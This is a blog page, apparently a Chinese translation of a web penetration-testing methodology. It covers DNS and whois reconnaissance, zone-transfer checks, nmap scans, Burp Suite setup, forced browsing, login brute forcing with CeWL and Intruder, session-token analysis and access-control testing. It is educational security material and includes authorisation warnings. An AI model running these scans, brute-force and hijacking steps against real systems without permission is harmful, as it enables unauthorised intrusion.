<!DOCTYPE html>
<html lang=zh-CN>
  <head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="Purse the balance of everything.">
  <meta name="keywords" content="CTF, Blog">
  
    <link rel="icon" href>
  
    
  <title>Web渗透方法论 | Mads Blog</title>
  <link rel="stylesheet" href="/style.css">
  <link rel="stylesheet" href="/css/my.css">
  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/gitalk.css">
  <script src="/lib/gitalk.min.js"></script>
  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">

</head>

<body>
  <header>
  <div class="header-container">
    <a class='logo' href="/">
      <i class="fas fa-cat" style="margin-right: 10px"></i>
      <span>Mads Blog</span>
    </a>
    <ul class="right-header">
      
        <li class="nav-item">
          
            <a href="/" class="item-link">首页</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/about" class="item-link">关于</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/archives" class="item-link">归档</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/tags" class="item-link">标签</a>
          
        </li>
      
    </ul>
  </div>
</header>

  <main id='post'>
  <div class="content">
    <article>
        <section class="content aath-body">
          <h1>Web渗透方法论</h1>
          
          <div class='post-meta'>
            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2018年08月02日</time>
            
            
              | 
                  <i class="fa fa-tags" aria-hidden="true"></i>
                
               
  <a href="/tags/#WEB" class='tag'>WEB</a>

  <a href="/tags/#翻译" class='tag'>翻译</a>


            
            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年02月17日</time>
          </div>
          
          <p><em>本篇翻译自<a href="https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/" target="_blank" rel="noopener">这里</a></em></p>
<p>*译者注：文章对Web渗透测试全貌进行了描述，介绍了许多实用的想法与方法，仔细阅读会有收获EB</p>
<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>这篇笔记是对Web应用程序渗透中的经典步骤的总结。我会将这些步骤分解为一个个的子任务并在各个子任务中推荐并介绍一些工具。</p>
<p>本文展示的许多技巧来自<a href="https://lanmaster53.com/" target="_blank" rel="noopener">这里</a>，作者已允许转载。</p>
<p>请记住我介绍的这些步骤都是迭代的，所以在一次渗透过程中，你可能会使用他们多次。举个栗子，当你设法获取一个应用程序的不同等级的权限时，比如从普通用户提升到管理员用户，可能就需要迭代利用。</p>
<p>序言最后需要说明的是，这篇笔记的很多地方使用了收费的PortSwigger的<a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite Professional</a>。对此我表示抱歉，但我认为这个工具还是物超所值的。</p>
<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><blockquote>
<p>在一次Web渗透过程中，信息收集的目的是站在旁观者的角度，去了解整个Web应用的全貌。</p>
</blockquote>
<h3 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1. 目标确认"></a>1. 目标确认</h3><table>
<thead>
<tr>
<th>工具</th>
<th>简介</th>
</tr>
</thead>
<tbody>
<tr>
<td>Whois</td>
<td>基于RFC 3912，用于查询域名相关信息的协议。</td>
</tr>
<tr>
<td>Dig</td>
<td>域名信息获取工具(Domain information groper)简称，是一个命令行的用于查询DNS服务器的网络管理工具。</td>
</tr>
<tr>
<td>DNSRecon</td>
<td>自动化DNS枚举脚本，由<a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">darkoperator</a>维护。</td>
</tr>
</tbody>
</table>
<h4 id="1-1-域名注册信息"><a href="#1-1-域名注册信息" class="headerlink" title="1.1 域名注册信息"></a>1.1 域名注册信息</h4><p>通过如下步骤确认目标所有者信息：</p>
<ol>
<li><p>Whois 目标域名/主机名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>解析目标域名/主机名的IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +short example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>Whois IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois 104.27.178.12</span><br></pre></td></tr></table></figure>
</li>
<li><p>分析输出结果</p>
</li>
</ol>
<p>如果目标开启了whois隐私保护，那么返回的结果可能是经过混淆的。</p>
<blockquote>
<p>！！不要攻击未经授权的站点。作为渗透测试人员，有责任在测试之前明确自己有没有获得目标所有者赋予的权限对目标进行测试。这也是为什么目标确认是开始渗透测试的第一步。</p>
</blockquote>
<h4 id="1-2-DNS信息查询"><a href="#1-2-DNS信息查询" class="headerlink" title="1.2 DNS信息查询"></a>1.2 DNS信息查询</h4><p>我喜欢去 <a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a> 查询目标站点的DNS信息，这是一款很不错的在线DNS信息查询工具。</p>
<ul>
<li>正向查询</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dig +nocmd example.com A +noall +answer</span><br><span class="line">dig +nocmd example.com NS +noall +answer</span><br><span class="line">dig +nocmd example.com MX +noall +answer</span><br><span class="line">dig +nocmd example.com TXT +noall +answer</span><br><span class="line">dig +nocmd example.com SOA +noall +answer</span><br><span class="line">...</span><br><span class="line">dig +nocmd example.com ANY +noall +answer (This rarely works)</span><br></pre></td></tr></table></figure>
<ul>
<li>反向查询</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig -x 104.27.179.12</span><br><span class="line">dig -x 104.27.178.12</span><br></pre></td></tr></table></figure>
<h4 id="1-3-测试域传送漏洞"><a href="#1-3-测试域传送漏洞" class="headerlink" title="1.3 测试域传送漏洞"></a>1.3 测试域传送漏洞</h4><p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。(译者注：可以看<a href="https://www.waitalone.cn/dns-domain-transfer-exploits.html" target="_blank" rel="noopener">这个</a>)虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。</p>
<blockquote>
<p>域传送漏洞很容易避免。至少管理员可以设置只允许白名单内的IP列表可以进行域传送请求。</p>
</blockquote>
<ul>
<li>使用示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig -t NS zonetransfer.me +short</span><br><span class="line">dig -t AXFR zonetransfer.me @nsztm1.digi.ninja </span><br><span class="line">dig -t AXFR zonetransfer.me @nsztm2.digi.ninja</span><br></pre></td></tr></table></figure>
<ul>
<li>DNSRecon 可以自动化进行，而且往往会返回更多额外的信息。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d example.com</span><br></pre></td></tr></table></figure>
<h3 id="2-OSINT-公开情报收集"><a href="#2-OSINT-公开情报收集" class="headerlink" title="2. OSINT 公开情报收集"></a>2. OSINT 公开情报收集</h3><table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon-NG</td>
<td>Tim ‘Lanmaster53’ Tomes写的公开情报工具框架，由社区维护。<a href="http://recon-ng.com/" target="_blank" rel="noopener">http://recon-ng.com/</a></td>
</tr>
<tr>
<td>Maltego</td>
<td>Maltego 是一款交互式的数据挖掘工具，它可以渲染出图用于关联分析。</td>
</tr>
<tr>
<td>theharvester</td>
<td>theHarvester 可以从不同的公开资源中收集邮箱、子域名、虚拟主机、开放的端口/主机指纹和员工姓名等信息</td>
</tr>
</tbody>
</table>
<p>我本想在这份笔记中包含详细的OSINT的介绍，但是想了想决定不这样做。因为我觉得这个部分可以单独写一篇（可能在之后的几篇中）。</p>
<p>在这篇笔记中我就介绍一些非常棒的关于OSINT的干货，我想渗透测试者们对于这些干货应该非常熟悉：</p>
<ul>
<li><p>Michael Bazzell</p>
<ul>
<li><a href="https://inteltechniques.com" target="_blank" rel="noopener">https://inteltechniques.com</a></li>
<li><a href="https://www.amazon.com/dp/1984201573/ref=as_li_ss_tl?ie=UTF8&amp;qid=1516984461&amp;sr=8-10&amp;keywords=open+source+intelligence+techniques&amp;linkCode=sl1&amp;tag=hookaround-20&amp;linkId=1fc9d5a9d120f07b7ba934120ef485a2" target="_blank" rel="noopener">Open Source Intelligence Techniques</a></li>
</ul>
</li>
<li><p>Google Dorking</p>
<ul>
<li><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></li>
</ul>
</li>
</ul>
<h2 id="0x02-Mapping"><a href="#0x02-Mapping" class="headerlink" title="0x02 Mapping"></a>0x02 Mapping</h2><blockquote>
<p>在一次渗透测试过程中，Mapping的目的是站在一个普通用户的角度去了解整个应用的全貌。</p>
</blockquote>
<h3 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h3><table>
<thead>
<tr>
<th>工具</th>
<th>介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td>Nmap</td>
<td>带服务识别和操作系统指纹识别的TCP/IP主机和端口扫描工具</td>
</tr>
</tbody>
</table>
<h4 id="1-1-端口扫描，服务识别，OS识别"><a href="#1-1-端口扫描，服务识别，OS识别" class="headerlink" title="1.1 端口扫描，服务识别，OS识别"></a>1.1 端口扫描，服务识别，OS识别</h4><ul>
<li><p>扫描前1000号TCP端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sP 192.168.100.0-7</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描80,443端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,443 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -A 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap –A –p- 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描前1000号UDP端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描所有65535个UDP端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>! 端口扫描通常是渗透过程中第一步和第二步的过渡部分。要非常注意暴露的端口、服务版本和OS/s！</p>
</blockquote>
<h3 id="2-浏览器代理设置"><a href="#2-浏览器代理设置" class="headerlink" title="2. 浏览器代理设置"></a>2. 浏览器代理设置</h3><h4 id="2-1-Firefox"><a href="#2-1-Firefox" class="headerlink" title="2.1 Firefox"></a>2.1 Firefox</h4><table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Firefox</td>
<td>跨平台的一款现代浏览器，有很多有用的插件</td>
</tr>
</tbody>
</table>
<p><code>Firefox</code>通常是Web渗透测试过程中的首选浏览器，这是因为它有很多有用的插件以及它的代理设置不会影响到全局代理。</p>
<h4 id="2-2-Firefox插件"><a href="#2-2-Firefox插件" class="headerlink" title="2.2 Firefox插件"></a>2.2 Firefox插件</h4><table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>User Agent Switcher</td>
<td>一款可以快速切换用户代理的Firefox插件</td>
</tr>
<tr>
<td>Wappalyzer</td>
<td>可以检测各种各样的网站所用的技术和软件组件的插件</td>
</tr>
<tr>
<td>FoxyProxy</td>
<td>代理切换插件</td>
</tr>
</tbody>
</table>
<p>这些插件在每次渗透测试过程中我总能用得到，我推荐你在第二步(Mapping)之前安装好它们。</p>
<h4 id="2-3-配置Firefox和Burpsuit"><a href="#2-3-配置Firefox和Burpsuit" class="headerlink" title="2.3 配置Firefox和Burpsuit"></a>2.3 配置Firefox和Burpsuit</h4><p>在你进行Mapping之前你一定要配置要浏览器的代理，让流量经过<code>Burp</code>。</p>
<ul>
<li><p>在<code>Firefox</code></p>
<ul>
<li><p>配置插件<code>FoxyProxy</code></p>
<ul>
<li>IP: 127.0.0.1</li>
<li>Port: 8080</li>
</ul>
</li>
<li><p>配置<code>Firefox</code>信任Burp的SSL证书</p>
<ul>
<li>打开<code>http://burp/</code></li>
<li>保存证书</li>
<li>将证书导入<code>Firefox</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-4-Burp配置"><a href="#2-4-Burp配置" class="headerlink" title="2.4 Burp配置"></a>2.4 Burp配置</h4><table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Suit Pro</td>
<td>Web安全测试套件</td>
</tr>
</tbody>
</table>
<p>你应该配置Burp让他适合自己的喜好。但是至少我推荐你设置<code>Scan Speed</code>为<code>thorough</code>，这样你在使用扫描器时就会发出更多地请求从而扫描出更多的漏洞。</p>
<h4 id="2-5-Burp扩展"><a href="#2-5-Burp扩展" class="headerlink" title="2.5 Burp扩展"></a>2.5 Burp扩展</h4><table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Extender</td>
<td>用于扩展Burp suite功能的API，可以在BApp商店获取</td>
</tr>
<tr>
<td>Retire.js (BApp)</td>
<td>用于检测版本落后的Javascript组件漏洞的Burp suite扩展</td>
</tr>
<tr>
<td>Wsdler (BApp)</td>
<td>可以解析WSDL文件，然后测试所有的允许的方法的请求</td>
</tr>
<tr>
<td>Python Scripter (BApp)</td>
<td>可以在每个HTTP请求和响应时执行一段用户定义的Python脚本</td>
</tr>
</tbody>
</table>
<p>这些<code>Burp</code>扩展是我在渗透测试过程中经常使用的。和<code>Firefox</code>扩展一样，我建议你们在Mapping之前安装好它们。</p>
<p>它们可以使用<code>Burp Suite Pro</code>的<code>Burp Extender</code>模块来安装。</p>
<h3 id="3-人工浏览"><a href="#3-人工浏览" class="headerlink" title="3. 人工浏览"></a>3. 人工浏览</h3><p>人工浏览可能是Mapping过程中最重要的部分。你有必要去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。</p>
<blockquote>
<p>！！！手工浏览对于单页应用非常非常重要。自动化的网页爬虫不能够爬到单页应用因为单页应用的HTTP请求都是用异步的AJAX来进行的。</p>
</blockquote>
<h3 id="4-自动化爬取"><a href="#4-自动化爬取" class="headerlink" title="4. 自动化爬取"></a>4. 自动化爬取</h3><p>自动化爬取是使用<code>Burp Spider</code>来进行的，这个过程可以发现你手工浏览没有发现的一些页面。通常来说Burp Spider会在传统的Web应用中发现更多的页面。</p>
<blockquote>
<p>！！！自动化爬虫非常危险。通常我会手工浏览80%~95%的页面，只用爬虫爬取很少的部分。因为在特定情况下爬虫很容易失效。</p>
</blockquote>
<h3 id="5-后续分析"><a href="#5-后续分析" class="headerlink" title="5. 后续分析"></a>5. 后续分析</h3><p>这个时候你应该使用<code>Burp</code>完成了Mapping这一步第一次的迭代，你应该注意目前掌握的所有信息。</p>
<h4 id="5-1-需要特别注意"><a href="#5-1-需要特别注意" class="headerlink" title="5.1 需要特别注意"></a>5.1 需要特别注意</h4><ul>
<li>Web 服务器</li>
<li>Web 软件体系结构(技术栈)</li>
<li>编程语言</li>
<li>框架</li>
<li>设计模式</li>
</ul>
<p>这个时候你可以注意一些需要特定页面跳转的功能点。通常这些功能点可以被手工操控，从而使其不用满足特定跳转顺序就可以实现，这可以让你有重大发现。(举个栗子，电子商务网站的付款功能，密码重置页面等)</p>
<h2 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h2><blockquote>
<p>在一次渗透测试过程中，漏洞挖掘是在攻击者的角度来了解整个Web应用的全貌。</p>
</blockquote>
<h3 id="1-过渡"><a href="#1-过渡" class="headerlink" title="1. 过渡"></a>1. 过渡</h3><p>在你Mapping之后，并且进行了一些基本的功能性的分析后，就可以开始进行漏洞挖掘了。这个步骤中，你应该尽可能多的识别出Web应用存在的漏洞。这些漏洞不仅是<code>The OWASP Top 10</code>中包含的那些，还包含于应用的商业逻辑中。记住一点，你将会遇到大量的漏洞，它不属于任何一个现有的分类中，你应该时刻警惕这一点。</p>
<h3 id="2-内容挖掘"><a href="#2-内容挖掘" class="headerlink" title="2. 内容挖掘"></a>2. 内容挖掘</h3><h4 id="2-1-漏洞扫描"><a href="#2-1-漏洞扫描" class="headerlink" title="2.1 漏洞扫描"></a>2.1 漏洞扫描</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Nikto</td>
<td>有指纹识别功能的Web服务漏洞扫描器</td>
</tr>
</tbody>
</table>
<p><code>Nikto</code>当之无愧的是最好的Web服务漏洞扫描器，特别是在大型的Web应用程序中表现非常好。它可以利用<code>-Format</code>选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p>
<ul>
<li>扫描目标并将结果导出成HTML格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://example.com -output ~/nikto.html -Format htm</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>漏洞扫描通常是第二步和第三步的过渡。一旦有了扫描结果，一定要花时间去分析一下结果，打开一些引人注目的页面看看。</p>
</blockquote>
<h3 id="3-强制浏览-译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思"><a href="#3-强制浏览-译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思" class="headerlink" title="3. 强制浏览(译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思)"></a>3. 强制浏览(译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思)</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Engagement Tools</td>
<td>Burp Suite Pro中自带的有特殊用途的工具集</td>
</tr>
<tr>
<td>Engagement Tool: Discover Content</td>
<td>Burp Suite Pro自带的用于强制浏览的工具</td>
</tr>
<tr>
<td>Burp Intruder</td>
<td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection, 等)</td>
</tr>
<tr>
<td>FuzzDB</td>
<td>包含各种恶意输入、资源名、用于grep搜索响应内容的字符串、Webshell等。</td>
</tr>
</tbody>
</table>
<p>强制浏览是一种挖掘技巧，它可以发现应用程序中没有被引用但是确实是可以访问的页面。<code>Discover Content</code>是<code>Burp</code>中专门用于此目的的工具。除此之外，<code>Burp Intruder</code>也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)。<code>FuzzDB</code>包含一些用于此目的的非常牛逼的字典，你可以在<a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery" target="_blank" rel="noopener">这里</a>看看。</p>
<h4 id="3-1-测试可选内容"><a href="#3-1-测试可选内容" class="headerlink" title="3.1 测试可选内容"></a>3.1 测试可选内容</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>User Agent Switcher</td>
<td>用于迅速切换浏览器的User Agent的一款Firefox插件</td>
</tr>
<tr>
<td>Burp Intruder</td>
<td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection, 等)</td>
</tr>
<tr>
<td>FuzzDB</td>
<td>包含各种恶意输入、资源名、用于grep搜索响应内容的字符串、Webshell等。</td>
</tr>
</tbody>
</table>
<p>在内容挖掘这一步，我非常喜欢做一件事。那就是利用<code>User Agent Switcher</code>切换不同的User Agent然后访问同一个特定页面。这是因为很多的Web应用对于不同的<code>User-Agent</code>和<code>Referer</code>请求头会返回不同的内容。</p>
<p>我经常使用<code>Burp Intruder</code>来模糊测试<code>User-Agent</code>和<code>Referer</code>请求头，一般还利用<code>FuzzDB</code>的字典。</p>
<h3 id="4-自动化的漏洞挖掘"><a href="#4-自动化的漏洞挖掘" class="headerlink" title="4. 自动化的漏洞挖掘"></a>4. 自动化的漏洞挖掘</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Scanner</td>
<td>自动化扫描安全漏洞的Burp Suite工具</td>
</tr>
</tbody>
</table>
<p>当你在Mapping和进行漏洞挖掘的开始部分时候，<code>Burp Passive Scanner</code>就已经在后台悄悄运行。你应该先分析这份扫描结果，然后再进行<code>Burp Active Scanner</code>，这样在<code>Burp Passive Scanner</code>中发现的值得关注的页面就可以在<code>Burp Active Scanner</code>中进行详细的扫描。</p>
<p>由于Burp Active Scanner完成所需的时间非常长，我更喜欢只允许一小段时间，然后查看两者之间的扫描结果并记录结果。</p>
<blockquote>
<p>！！！自动化的漏洞扫描是很危险的。用Burp Scanner可能导致不良的影响。除非你非常熟悉目标的功能与环境，否则你只应在非生产环境中使用。</p>
</blockquote>
<h3 id="5-配置"><a href="#5-配置" class="headerlink" title="5. 配置"></a>5. 配置</h3><h4 id="5-1-默认配置"><a href="#5-1-默认配置" class="headerlink" title="5.1 默认配置"></a>5.1 默认配置</h4><p>在确认了目标所使用的技术后，很自然的一步跟进就是测试有没有默认配置。许多框架使用许多易受攻击默认配置的应用程序以便于向开发人员介绍他们的产品。然后由于开发人员的疏忽，这些示例应用被部署到和目标站点所在的同一台服务器上，这使得目标站点承受很大的风险。</p>
<h4 id="5-2-错误配置"><a href="#5-2-错误配置" class="headerlink" title="5.2 错误配置"></a>5.2 错误配置</h4><p>在Web渗透测试的每一步，你都应该注意Web应用有没有错误的配置。你可以特别关注页面出现的错误信息，这些信息经常会给出很有用的<code>数据库结构</code>和<code>服务器文件系统</code>等信息。</p>
<blockquote>
<p>错误信息几乎总能够发现一些。这些错误信息在注入和LFI(Local File Include)中特别有用。</p>
</blockquote>
<p>另外一个值得注意的是页面的敏感表单有没有禁用自动填充。比如密码字段经常会有一个“显示/隐藏”按钮。浏览器默认不会填充<code>type=&quot;password&quot;</code>的<code>input</code>标签内容，而当密码字段是“显示”时，<code>input</code>标签就变成了<code>type=&quot;text&quot;</code>，这样浏览器就会进行自动填充。这在多用户环境下是一个隐患。</p>
<h3 id="6-身份认证"><a href="#6-身份认证" class="headerlink" title="6. 身份认证"></a>6. 身份认证</h3><p>在漏洞挖掘过程中，你应该认真审视你看到的每个登录表单。如果这些表单没有做很好的安全措施(比如双重认证，验证码，禁止重复提交等)，攻击者就可能得到用户账户未授权的权限。取决于表单的不同实现以及不同的框架/CMS，即使登录失败目标站点也可能会透露出用户账户的一些信息。</p>
<p>如果你测试发现了上述所讨论的问题，你应该关注并记录。另外，如果登录表单没有加密(或者利用了旧版本的SSL/TLS)，这也应该关注并记录。</p>
<h4 id="6-1-模糊登录测试"><a href="#6-1-模糊登录测试" class="headerlink" title="6.1 模糊登录测试"></a>6.1 模糊登录测试</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>CeWL</td>
<td>通过爬取目标站点来生成用户字典的工具</td>
</tr>
<tr>
<td>Burp Intruder</td>
<td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection, 等)</td>
</tr>
</tbody>
</table>
<p>在你认真审视了登录表单后，就可以开始登录测试了。<code>CeWL</code>是一款非常好用的用于生成一次性字典的工具。你可以利用<code>-h</code>查看帮助文档。</p>
<p>基本语法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl [options] www.example.com</span><br></pre></td></tr></table></figure></p>
<p>当你构造好用户字典后就可以开始用<code>Burp Intruder</code>进行实际的模糊测试了。通常我会用两个payload集(一个是用户名的，另一个是<code>CeWL</code>生成的密码)。Intruder的Attack Type通常应该选<code>Cluster Bomb</code>。</p>
<h3 id="7-Session管理"><a href="#7-Session管理" class="headerlink" title="7. Session管理"></a>7. Session管理</h3><p>Session-token/Cookie分析在渗透测试过程中虽然不是很吸引人的部分，但确实非常重要的一块。通常是这样子的，你想了解整个web应用是如何跟踪Session，然后用<code>Burp Sequencer</code>这样的工具去测试session token的随机性/可预测性。一些应用(较传统的应用)会把session的内容存储在客户端。有时候这些数据里面会包含有加密的，序列化的敏感信息。</p>
<p>这时也应该检查HTTP返回头的<code>Set-Cookie</code>是否包含<code>Secure</code>和<code>HttpOnly</code>的标识。如果没有的话就值得注意了，因为没有理由不设置这些标识位。</p>
<blockquote>
<p>Google搜索你得到的session token，可能会有一些发现，比如Session可预测等，这样就可以进行Session劫持攻击。</p>
</blockquote>
<h4 id="7-1-用Burp测试Session-Tokens"><a href="#7-1-用Burp测试Session-Tokens" class="headerlink" title="7.1 用Burp测试Session Tokens"></a>7.1 用Burp测试Session Tokens</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Sequencer</td>
<td>Burp用来分析数据集的随机性的模块</td>
</tr>
</tbody>
</table>
<p><code>Burp Sequencer</code>是用来测试Session Token随机性和可预测性的很好的工具。当你用这个工具来测试目标的Session管理时，你应该先清除所有的Cookies，然后重新认证一次。然后就可以把带有<code>Set-Cookie</code>头的返回包发送给<code>Burp Sequencer</code>，然后Sequencer就会启动新的拦截对Token进行分析。通常10000次请求就差不多可以判断随机性和可预测性了。</p>
<p>如果发现Session token不够随机，那就可以考虑Session劫持了。</p>
<h3 id="8-授权"><a href="#8-授权" class="headerlink" title="8. 授权"></a>8. 授权</h3><p>授权漏洞很像<a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control" target="_blank" rel="noopener">功能级访问控制缺失</a>和<a href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References" target="_blank" rel="noopener">不安全的直接对象引用</a>漏洞，是很长一段时间我发现的最流行的漏洞。这是因为许多的开发者没有想到一个低权限甚至是匿名用户会去向高权限的接口发送请求(失效的权限控制)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/app/admin_getappInfo</span><br></pre></td></tr></table></figure></p>
<p>或者是去请求其他用户的数据(不安全的直接对象引用，译者注：水平越权)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/app/accountInfo?acct=notmyacct</span><br></pre></td></tr></table></figure></p>
<h4 id="8-1-测试权限控制"><a href="#8-1-测试权限控制" class="headerlink" title="8.1 测试权限控制"></a>8.1 测试权限控制</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Compare Site Maps</td>
<td>Burp的用于测试授权的模块</td>
</tr>
</tbody>
</table>
<p>这里有个小技巧，就是注册两个不同权限的用户，然后用高权限的用户去访问整个Web应用，退出高权限用户，登录低权限用户,然后用Burp的<code>Compare Site Maps</code>工具去测试哪些页面的权限控制没有做好。</p>
<h3 id="9-数据验证测试"><a href="#9-数据验证测试" class="headerlink" title="9. 数据验证测试"></a>9. 数据验证测试</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp Repeater</td>
<td>用于手工修改、重放HTTP请求的Burp模块</td>
</tr>
</tbody>
</table>
<p>注入漏洞的存在是因为Web应用接受任意的用户输入，并且在服务端没有正确验证用户的输入的有效性。作为一个渗透测试者，你应该注意每一个接受随意的用户输入的地方并设法进行注入。</p>
<p>因为每个Web应用情况都不一样，所以没有一种万能的注入方式。接下来，我会把注入漏洞进行分类并且给出一些Payload。<code>Burp Repeater</code>是我测试注入漏洞时最常使用的工具。它可以重放HTTP请求，并且可以随时修改Payload。</p>
<p>有一件事需要谨记：漏洞挖掘阶段要做的只是识别漏洞，而漏洞利用阶段才会利用漏洞做更多地事。当然，每个注入漏洞都值得被记录，你可以在漏洞挖掘阶段之后对这些注入漏洞进行深入的测试。</p>
